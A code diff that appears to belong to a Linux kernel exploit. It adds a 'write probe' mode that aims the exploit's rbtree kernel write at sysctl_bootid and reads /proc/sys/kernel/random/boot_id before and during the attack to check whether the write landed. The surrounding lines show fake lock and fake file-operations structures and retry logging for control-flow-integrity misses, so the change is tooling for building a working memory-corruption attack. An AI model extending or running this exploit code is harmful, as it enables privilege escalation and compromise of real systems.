@@ -166,6 +166,55 @@ uint64_t slide_bootid_after;
 uint64_t slide_bootid_want;
 ssize_t slide_bootid_restore_ret = -1;
 
+// First eight bytes of /proc/sys/kernel/random/boot_id, in the same
+// little-endian order slide61.c reads them, or 0 if it cannot be read. Used
+// only by FOPS_WRITE_PROBE, which aims the rbtree write at sysctl_bootid so
+// that a write userspace cannot otherwise observe becomes observable.
+static uint64_t read_bootid_first8(void) {
+  char buf[64];
+  int fd = open("/proc/sys/kernel/random/boot_id", O_RDONLY | O_CLOEXEC);
+  if (fd < 0) {
+    return 0;
+  }
+  ssize_t n = read(fd, buf, sizeof(buf) - 1);
+  close(fd);
+  if (n <= 0) {
+    return 0;
+  }
+  buf[n] = 0;
+
+  unsigned char raw[8];
+  int nibble = -1;
+  int out = 0;
+  for (ssize_t i = 0; i < n && out < 8; i++) {
+    int c = (unsigned char)buf[i];
+    int v;
+    if (c >= '0' && c <= '9') {
+      v = c - '0';
+    } else if (c >= 'a' && c <= 'f') {
+      v = c - 'a' + 10;
+    } else if (c >= 'A' && c <= 'F') {
+      v = c - 'A' + 10;
+    } else {
+      continue;
+    }
+    if (nibble < 0) {
+      nibble = v;
+      continue;
+    }
+    raw[out++] = (unsigned char)((nibble << 4) | v);
+    nibble = -1;
+  }
+  if (out != 8) {
+    return 0;
+  }
+  uint64_t value = 0;
+  for (int i = 0; i < 8; i++) {
+    value |= (uint64_t)raw[i] << (i * 8);
+  }
+  return value;
+}
+
 static int route_delay_usec(int attempt) {
   int default_delay = pselect_custom_write_enabled() ? 0 : -1;
   int override = env_int_range("PSELECT_ROUTE_DELAY_USEC",
@@ -490,6 +539,17 @@ void do_tcp_fake_lock_route(void) {
           page_base, fake_lock, fake_w0, fake_fops, waiter_task,
           route_attempts, page_attempts, arm_seq, post_hold);
 
+  // With FOPS_WRITE_PROBE the rbtree write is aimed at sysctl_bootid, which
+  // userspace can read back. Sample it before the route so the per-page lines
+  // below have something to compare against.
+  int write_probe = env_flag("FOPS_WRITE_PROBE", 0);
+  uint64_t probe_before = write_probe ? read_bootid_first8() : 0;
+  if (write_probe) {
+    pr_info("main tcp write probe armed target=sysctl_bootid want=%016llx "
+            "bootid_before=%016llx\n",
+            (unsigned long long)fake_fops, (unsigned long long)probe_before);
+  }
+
   atomic_store(&main_tcp_punch_stop, 0);
   atomic_store(&main_tcp_punch_phase, 0);
   atomic_store(&main_tcp_punch_go, 1);
@@ -589,8 +649,16 @@ void do_tcp_fake_lock_route(void) {
       }
       cfi_misses++;
       if (cfi_misses >= cfi_attempts_per_page) {
-        pr_info("main tcp route page=%d cfi misses=%d refresh\n",
-                page_attempt, cfi_misses);
+        if (write_probe) {
+          uint64_t now = read_bootid_first8();
+          pr_info("main tcp route page=%d cfi misses=%d probe bootid=%016llx "
+                  "changed=%d want=%016llx refresh\n",
+                  page_attempt, cfi_misses, (unsigned long long)now,
+                  now != probe_before, (unsigned long long)fake_fops);
+        } else {
+          pr_info("main tcp route page=%d cfi misses=%d refresh\n",
+                  page_attempt, cfi_misses);
+        }
         break;
       }
     }
